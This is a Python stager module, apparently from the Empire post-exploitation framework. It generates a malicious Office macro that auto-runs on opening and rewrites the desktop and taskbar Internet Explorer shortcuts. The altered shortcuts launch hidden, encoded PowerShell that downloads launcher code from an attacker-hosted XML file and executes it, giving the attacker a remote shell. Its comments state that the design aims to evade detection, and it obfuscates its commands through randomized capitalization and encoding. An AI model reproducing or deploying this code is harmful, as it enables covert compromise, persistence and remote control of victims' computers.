from lib.common import helpers

#This is a two-step attack vector, the initial macro that a user runs will configure a shortcut on their desktop to run powershell.  The second step occurs when the user clicks on the shortcut, the powershell download stub that runs will attempt to download & execute empire launcher code from an xml file hosted at a pre-defined location, which will in turn give you a shell back.  This is done to defeat application-aware security measures that flag on launches of powershell from unexpected programs, such as a direct launch from office applications.  As the macro is purely vba and does not leverage powershell the macro will not be detected. 

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'BackdoorLnkFileMacroXML',

            'Author': ['G0ldenGun'],

            'Description': ('Generates an office macro that sets up a backdoored .lnk file, which in turn attempts to download & execute an empire launcher when the user clicks on it. \n\nUsage: Two files will be spawned from this, a macro that should be placed in an office document and an xml that should be placed on a web server accessible by the remote system.  By default this xml is written to /var/www/html, which is the webroot on debian-based systems such as kali.'),

            'Comments': [
                '' 
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'LNKPath' : {
                'Description'   :   'DOESNT DO ANYTHING YET AS WE ARE HARDCODED FOR IE, PUT ANYTHING IN HERE -- Full path to the .LNK to backdoor.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'XmlUrl' : {
                'Description'   :   'remotely-accessible URL to access the XML containing launcher code.',
                'Required'      :   True,
                'Value'         :   "http://" + helpers.lhost() + "/netInfo.xml"
            },
            'OutFile' : {
                'Description'   :   'File to output macro to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   '/tmp/macro'
            },
	    'XmlOutFile' : {
                'Description'   :   'Local path + file to output xml to.',
                'Required'      :   True,
                'Value'         :   '/var/www/html/netInfo.xml'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
 	    'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }

        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
	lnkPath = self.options['LNKPath']['Value']
	XmlPath = self.options['XmlUrl']['Value']
	XmlOut = self.options['XmlOutFile']['Value']
	regParts = XmlPath.split("\\")
	path = "\\".join(regParts[0:len(regParts)-1])
	name = regParts[len(regParts)-1]

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
	launcher = launcher.split(" ")[-1]

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            chunks = list(helpers.chunks(launcher, 50))
            payload = "\tDim encRP As String\n"
            payload += "\tencRP = \"" + str(chunks[0]) + "\"\n"
            for chunk in chunks[1:]:
                payload += "\tencRP = encRP + \"" + str(chunk) + "\"\n"

            macro = "Sub Auto_Open()\n"
            macro += "\tOffice\n"
            macro += "End Sub\n\n"


            macro += "Public Function Office() As Variant\n"
           # macro += payload
	
	    macro += "Dim myWS As Object, lnk as Object\n"
	    macro += "Set myWS = CreateObject(\"Wscript.Shell\")\n"
#set up first link - creates / replaces iexplore.lnk (display name iexplore) on users desktop if it sees it
	    macro += "Set lnk = myWS.CreateShortcut(myWS.SPecialFolders(\"desktop\") & \"\\iexplore.lnk\")\n"
	    
	    launchString1 = "[System.Diagnostics.Process]::Start(\"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\");$b = New-Object System.Xml.XmlDocument;$b.Load(\""
	    launchString2 = "\");[Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($b.command.a.execute))|IEX\n"

	    macro += "lnk.targetpath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"\n"

	    launchString1 = helpers.randomize_capitalization(launchString1)
	    launchString2 = helpers.randomize_capitalization(launchString2)
	    launchString = launchString1 + XmlPath + launchString2
	    encLaunch = helpers.enc_powershell(launchString)
	    macro += "lnk.arguments = \"-w hidden -nop -enc " + encLaunch + "\"\n"
	    macro += "lnk.IconLocation = \"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\"\n"
	    macro += "lnk.save\n"


#2nd link here -- will overwite ie if it finds a file named 'Internet Explorer' in the taskbar menu
	    macro += "Set lnk = myWS.CreateShortcut(Environ(\"AppData\") & \"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk\")\n"
	    macro += "lnk.targetpath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"\n"
	    macro += "lnk.arguments = \"-w hidden -nop -enc " + encLaunch + "\"\n"
	    macro += "lnk.IconLocation = \"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\"\n"
	    macro += "lnk.save\n"
	    macro += "End Function\n"

#write XML to disk

	    f = open(XmlOut,"w")
	    f.write("<?xml version=\"1.0\"?>\n")
	    f.write("<command>\n")
	    f.write("\t<a>\n")
	    f.write("\t<execute>"+launcher+"</execute>\n")
	    f.write("\t</a>\n")
	    f.write("</command>\n")

            return macro
